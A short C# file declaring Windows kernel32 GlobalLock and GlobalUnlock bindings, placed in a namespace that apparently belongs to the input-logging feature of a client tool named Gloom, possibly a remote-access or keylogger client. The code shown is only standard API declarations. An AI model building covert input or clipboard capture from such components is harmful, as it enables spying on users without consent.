using System.Runtime.InteropServices;

namespace Gloom.Client.Features.Logger.InputLog
{
	public static class Kernel32
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public unsafe static extern void* GlobalLock([In] IntPtr hMem);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GlobalUnlock([In] IntPtr hMem);
	}
}
